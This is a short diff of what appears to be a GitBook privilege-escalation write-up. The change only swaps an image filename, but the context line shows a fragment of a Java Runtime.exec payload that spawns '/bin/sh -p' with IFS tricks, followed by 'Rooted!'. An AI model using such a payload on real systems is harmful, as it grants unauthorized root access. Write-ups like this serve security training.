@@ -84,6 +84,6 @@ echo "Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc \$@|sh\${IFS
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (47) (7).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
